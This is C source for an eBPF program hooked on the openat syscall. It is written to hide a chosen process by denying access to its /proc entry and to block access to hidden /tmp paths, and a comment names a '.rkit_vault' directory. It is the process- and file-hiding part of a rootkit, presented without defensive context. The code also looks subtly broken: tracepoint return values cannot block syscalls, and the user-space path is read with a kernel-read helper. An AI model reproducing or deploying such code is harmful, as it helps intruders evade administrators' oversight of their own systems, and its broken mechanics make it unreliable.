#include "vmlinux.h"
#include <bpf/bpf_helpers.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

#define EACCES 13

struct
{
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, u32);
} hidden_pid_map SEC(".maps");

static __always_inline u32 get_hidden_pid()
{
    u32 key = 0;
    u32 *pid = bpf_map_lookup_elem(&hidden_pid_map, &key);
    return pid ? *pid : 0;
}

SEC("tp/syscalls/sys_enter_openat")
int hook_openat(struct trace_event_raw_sys_enter *ctx)
{
    u32 hidden_pid = get_hidden_pid();
    if (!hidden_pid)
    {
        return 0;
    }

    const char *filename = (const char *)ctx->args[1];
    char path[256];

    int ret = bpf_probe_read_kernel_str(path, sizeof(path), (void *)filename);
    if (ret < 0)
    {
        return 0;
    }

    if (path[0] == '/' && path[1] == 'p' && path[2] == 'r' &&
        path[3] == 'o' && path[4] == 'c' && path[5] == '/')
    {
        char pid_str[11] = {};
        u32 temp = hidden_pid;
        int pos = 10;

        if (temp == 0)
        {
            pid_str[9] = '0';
            pos = 9;
        }
        else
        {
            while (temp && pos > 0)
            {
                pid_str[pos - 1] = '0' + (temp % 10);
                temp /= 10;
                pos--;
            }
        }

        int match = 1;
        for (int i = 0; i < 10; i++)
        {
            if (pid_str[pos + i] == 0)
                break;
            if (path[6 + i] != pid_str[pos + i])
            {
                match = 0;
                break;
            }
        }

        if (match)
        {
            char next = path[6 + (10 - pos)];
            if (next == '/' || next == 0)
            {
                return -EACCES;
            }
        }
    }

    // Block /tmp/.rkit_vault
    if (path[0] == '/' && path[1] == 't' && path[2] == 'm' && path[3] == 'p' &&
        path[4] == '/' && path[5] == '.')
    {
        return -EACCES;
    }

    return 0;
}
